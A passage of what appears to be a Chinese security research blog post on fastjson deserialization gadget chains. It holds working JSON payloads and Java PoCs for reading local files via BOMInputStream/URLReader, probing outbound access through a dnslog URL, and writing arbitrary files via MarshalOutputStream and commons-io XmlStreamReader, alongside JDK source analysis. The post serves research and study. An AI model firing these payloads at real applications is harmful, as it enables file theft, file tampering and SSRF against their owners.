class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BOMReadFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;x\&quot;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;org.apache.commons.io.input.BOMInputStream\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;delegate\&quot;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            \&quot;@type\&quot;: \&quot;org.apache.commons.io.input.ReaderInputStream\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;            \&quot;reader\&quot;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                \&quot;@type\&quot;: \&quot;jdk.nashorn.api.scripting.URLReader\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;                \&quot;url\&quot;: \&quot;file:\\\\D:\\\\WebSafe\\\\JavaProject\\\\fastjson&quot;</span> +<br>            <span class="hljs-string">&quot;\\\\src\\\\main\\\\java\\\\com\\\\lingx5\\\\exp\\\\1.txt\&quot;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;            \&quot;charsetName\&quot;: \&quot;UTF-8\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;            \&quot;bufferSize\&quot;: 1024\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;boms\&quot;: [\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                \&quot;charsetName\&quot;: \&quot;UTF-8\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;                \&quot;bytes\&quot;: [49,50]\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &#125;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        ]\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;address\&quot;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;$ref\&quot;: \&quot;$.x.BOM\&quot;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parse(payload));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>1</code> 的 ASCII 码是 49，<code>2</code> 的是 50</p><p>我们运行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326141208782.png" alt="image-20250326141208782"></p><p>如果我们给的 boms 数组值不和文件匹配的话，结果就是 {“x”:{}}</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326141306045.png" alt="image-20250326141306045"></p><p>可以就此结果的差异，去根据 ascii 码表，爆破出文件的内容</p><p class="note note-success"> 不过这个利用还是比较苛刻的，我们更多的可能就是利用这个链条实现 ssrf 判断目标机器是否出网 </p><h5 id="其他用途"><a href="#其他用途" class="headerlink" title="其他用途"></a>其他用途</h5><p>把 url 的路径改为 dnslog 平台 <a href="http://6blpi0.dnslog.cn/">http://6blpi0.dnslog.cn</a></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326141931816.png" alt="image-20250326141931816"></p><p>其实这时候已经不再需要输出了，在 URLReader 执行 read 方法的时候，就已经把请求发送出去了，我们的 dnslog 平台就会有记录</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326141838270.png" alt="image-20250326141838270"></p><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><h4 id="MarshalOutputStream"><a href="#MarshalOutputStream" class="headerlink" title="MarshalOutputStream"></a>MarshalOutputStream</h4><p>最初公开的写文件的 POC 是这样的, 使用的 FileOutputStream，也是间接集成了 AutoCloseable</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span> &#x27;sun.rmi.server.MarshalOutputStream&#x27;<span class="hljs-punctuation">,</span><br>  &#x27;out&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    &#x27;@type&#x27;<span class="hljs-punctuation">:</span> &#x27;java.util.zip.InflaterOutputStream&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;out&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      &#x27;@type&#x27;<span class="hljs-punctuation">:</span> &#x27;java.io.FileOutputStream&#x27;<span class="hljs-punctuation">,</span><br>      &#x27;file&#x27;<span class="hljs-punctuation">:</span> &#x27;/tmp/test.txt&#x27;<span class="hljs-punctuation">,</span><br>      &#x27;append&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    &#x27;infl&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      &#x27;input&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-comment">// fastjson在处理byte数组时，会编码为base64，同样在处base64会自动解码为byte数组</span><br>        &#x27;array&#x27;<span class="hljs-punctuation">:</span> &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;<span class="hljs-punctuation">,</span><br>        &#x27;limit&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">22</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    &#x27;bufLen&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">1048576</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  &#x27;protocolVersion&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>主要也是利用到有参构造方法</p><p>MarshalOutputStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">MarshalOutputStream</span><span class="hljs-params">(OutputStream out, <span class="hljs-type">int</span> protocolVersion)</span><br>    <span class="hljs-keyword">throws</span> IOException<br>&#123;<br>    <span class="hljs-built_in">super</span>(out);<br>    <span class="hljs-built_in">this</span>.useProtocolVersion(protocolVersion);<br>    java.security.AccessController.doPrivileged(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.security.PrivilegedAction&lt;Void&gt;() &#123;<br>            <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                enableReplaceObject(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>它调用了 super(out); ，而在他的直接父类(ObjectOutputStream )的构造方法中有我们要利用的代码（<span style="color:#FF0000;"> 后边会有详细的调用栈 </span>）</p><blockquote><p>这里为什么不直接用 MarshalOutputStream 的父类 java.io.ObjectOutputStream 呢？还要让他去调用 super(out)</p><p>因为 ObjectOutputStream 类具有无参构造器，fastjson 会用无参构造器实例化之后去找 setter 方法，但父类没有对应的 setter 方法，所以写不进去内容，但是文件还是会创建，因为 fastjson 实现是扫描完成后， 在进行封装的。在封装的过程中完成了文件的创建</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326204824373.png" alt="image-20250326204824373"></p><p>传入的 out 为 InflaterOutputStream，并且指定写入内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InflaterOutputStream</span><span class="hljs-params">(OutputStream out, Inflater infl, <span class="hljs-type">int</span> bufLen)</span> &#123;<br>    <span class="hljs-built_in">super</span>(out);<br><br>    <span class="hljs-comment">// Sanity checks</span><br>    <span class="hljs-keyword">if</span> (out == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>(<span class="hljs-string">&quot;Null output&quot;</span>);<br>    <span class="hljs-keyword">if</span> (infl == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>(<span class="hljs-string">&quot;Null inflater&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bufLen &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Buffer size &lt; 1&quot;</span>);<br><br>    <span class="hljs-comment">// Initialize</span><br>    inf = infl;<br>    buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bufLen];<br>&#125;<br></code></pre></td></tr></table></figure><p>在封装 FileOutputStream，指定路径，指定 append 为 false，即覆盖文件内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">// 先获得了 String boolean的构造器</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">FileOutputStream</span><span class="hljs-params">(String name, <span class="hljs-type">boolean</span> append)</span><br>    <span class="hljs-keyword">throws</span> FileNotFoundException<br>&#123;<br>    <span class="hljs-built_in">this</span>(name != <span class="hljs-literal">null</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(name) : <span class="hljs-literal">null</span>, append);<br>&#125;<br><span class="hljs-comment">// 重载调用</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">FileOutputStream</span><span class="hljs-params">(File file, <span class="hljs-type">boolean</span> append)</span><br>    <span class="hljs-keyword">throws</span> FileNotFoundException<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (file != <span class="hljs-literal">null</span> ? file.getPath() : <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">SecurityManager</span> <span class="hljs-variable">security</span> <span class="hljs-operator">=</span> System.getSecurityManager();<br>    <span class="hljs-keyword">if</span> (security != <span class="hljs-literal">null</span>) &#123;<br>        security.checkWrite(name);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (name == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (file.isInvalid()) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileNotFoundException</span>(<span class="hljs-string">&quot;Invalid file path&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">this</span>.fd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileDescriptor</span>();<br>    fd.attach(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-built_in">this</span>.append = append;<br>    <span class="hljs-built_in">this</span>.path = name;<br><span class="hljs-comment">// 打开文件流，并指定追加内容</span><br>    open(name, append);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h5><p>MarshalOutputStream 的 super，就是 ObjectOutputStream 的带有 out 参数的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    verifySubclass();<br>    <span class="hljs-comment">// 创建BlockDataOutputStream实例</span><br>    bout = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BlockDataOutputStream</span>(out);<br>    handles = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandleTable</span>(<span class="hljs-number">10</span>, (<span class="hljs-type">float</span>) <span class="hljs-number">3.00</span>);<br>    subs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReplaceTable</span>(<span class="hljs-number">10</span>, (<span class="hljs-type">float</span>) <span class="hljs-number">3.00</span>);<br>    enableOverride = <span class="hljs-literal">false</span>;<br>    writeStreamHeader();<br>    <span class="hljs-comment">// 这个bout 是 用我们传入的InflaterOutputStream 创建的 BlockDataOutputStream</span><br>    bout.setBlockDataMode(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (extendedDebugInfo) &#123;<br>        debugInfoStack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DebugTraceInfoStack</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        debugInfoStack = <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>BlockDataOutputStream#setBlockDataMode 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-title function_">setBlockDataMode</span><span class="hljs-params">(<span class="hljs-type">boolean</span> mode)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">if</span> (blkmode == mode) &#123;<br>        <span class="hljs-keyword">return</span> blkmode;<br>    &#125;<br>    <span class="hljs-comment">// 调用了自己的drain()方法</span><br>    drain();<br>    blkmode = mode;<br>    <span class="hljs-keyword">return</span> !blkmode;<br>&#125;<br></code></pre></td></tr></table></figure><p>BlockDataOutputStream#drain 方法，我们接着看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">drain</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">if</span> (pos == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (blkmode) &#123;<br>        writeBlockHeader(pos);<br>    &#125;<br>    <span class="hljs-comment">// 这个out就是我们的 InflaterOutputStream 对象</span><br>    out.write(buf, <span class="hljs-number">0</span>, pos);<br>    pos = <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们就来到了 inflaterOutputStream#write(byte [], int, int) 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-comment">// ... 省略的一些，保留了关键代码</span><br>    <span class="hljs-comment">// Decompress and write blocks of output data</span><br>    <span class="hljs-comment">// 写文件 out为FileOutputStream 对象</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        n = inf.inflate(buf, <span class="hljs-number">0</span>, buf.length);<br>        <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br>            out.write(buf, <span class="hljs-number">0</span>, n);<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (n &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// Check the decompressor</span><br>    <span class="hljs-keyword">if</span> (inf.finished()) &#123;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (inf.needsDictionary()) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipException</span>(<span class="hljs-string">&quot;ZLIB dictionary missing&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终掉到了 java.io.FileOutputStream#writeBytes 而这个方法是 native 方法，调用 c 语言实现文件的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">byte</span> b[], <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    writeBytes(b, off, len, fdAccess.getAppend(fd));<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeBytes</span><span class="hljs-params">(<span class="hljs-type">byte</span> b[], <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len, <span class="hljs-type">boolean</span> append)</span><br>    <span class="hljs-keyword">throws</span> IOException;<br></code></pre></td></tr></table></figure><h5 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h5><p>简单总结调用流程 </p><p>fastjson 封装对象  <code>FileOutputStream</code> ,  <code>InflaterOutputStream</code> , <code>MarshalOutputStream</code>  </p><p>调用的流程</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">MarshalOutputStream的构造方法<br>ObjectOutputStream的构造方法<br>java.io.ObjectOutputStream.BlockDataOutputStream#setBlockDataMode<br>java.io.ObjectOutputStream.BlockDataOutputStream#drain<br>java.util.zip.InflaterOutputStream#write(byte[], int, int)<br>java.io.FileOutputStream#write(byte[], int, int)<br>java.io.FileOutputStream#writeBytes<br></code></pre></td></tr></table></figure><h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p><strong>MarshalWriteFile</strong></p><p>写个程序测试一下，我就只把路径改了一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MarshalWriteFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#x27;@type&#x27;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#x27;@type&#x27;: &#x27;sun.rmi.server.MarshalOutputStream&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#x27;out&#x27;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#x27;@type&#x27;: &#x27;java.util.zip.InflaterOutputStream&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#x27;out&#x27;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#x27;@type&#x27;: &#x27;java.io.FileOutputStream&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#x27;file&#x27;: &#x27;D:/WebSafe/JavaProject/fastjson/src/main/java/com/lingx5/poc/2.txt&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#x27;append&#x27;: false\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#x27;infl&#x27;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#x27;input&#x27;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &#x27;array&#x27;: &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &#x27;limit&#x27;: 22\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#125;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#x27;bufLen&#x27;: 1048576\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#x27;protocolVersion&#x27;: 1\n&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parse(payload));<br>        System.out.println(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用堆栈 , 并成功写文件</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327090057625.png" alt="image-20250327090057625"></p><p>而这个 POC 在不同的 JDK 版本是不通用的，这是为什么呢？</p><blockquote><p>在 java 编译字节码的时候，Java 编译器为了减小 <code>.class</code> 文件的大小和提高运行时性能，会在编译的时候把参数默认设置为 var0 var1 的样式，而不是参数的具体名称。从而让 fastjson 的反序列化器再利用 asm 获取有参构造器时，识别不到参数，也就拿不到构造器。所以链条就不能用了</p></blockquote><p>我们可以使用 <code>LocalVariableTable</code> 来判断这个类是不是具有具体的参数名称</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">javap <span class="hljs-literal">-l</span> &lt;class_name&gt; | findstr LocalVariableTable<br></code></pre></td></tr></table></figure><p>可以看到区别 在 jdk8 和 jdk17 中</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326160612318.png" alt="image-20250326160612318"></div><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326160316923.png" alt="image-20250326160316923"></div></div><div class="group-image-row"></div></div><p>这就说明 在 jdk17 中可以找到构造方法的</p><h4 id="XmlStreamReader"><a href="#XmlStreamReader" class="headerlink" title="XmlStreamReader"></a>XmlStreamReader</h4><p>适用版本 commons-io 2.0~2.6</p><p><a href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">voidfyoo</a> 师傅文章中已经写的很详细了，通过 XmlStreamReader 作为入口，循环调用来解决 buffer 长度不够的问题</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>  <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,<br>  <span class="hljs-string">&quot;is&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>:&#123;<br>      <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,<br>      <span class="hljs-string">&quot;reader&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,<br>        <span class="hljs-string">&quot;charSequence&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-string">&quot;aaaaaa&quot;</span><br>      &#125;,<br>      <span class="hljs-string">&quot;charsetName&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>,<br>      <span class="hljs-string">&quot;bufferSize&quot;</span>:<span class="hljs-number">1024</span><br>    &#125;,<br>    <span class="hljs-string">&quot;branch&quot;</span>:&#123;<br>      <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,<br>      <span class="hljs-string">&quot;writer&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,<br>        <span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;/tmp/pwned&quot;</span>,<br>        <span class="hljs-string">&quot;encoding&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>,<br>        <span class="hljs-string">&quot;append&quot;</span>: <span class="hljs-literal">false</span><br>      &#125;,<br>      <span class="hljs-string">&quot;charset&quot;</span>: <span 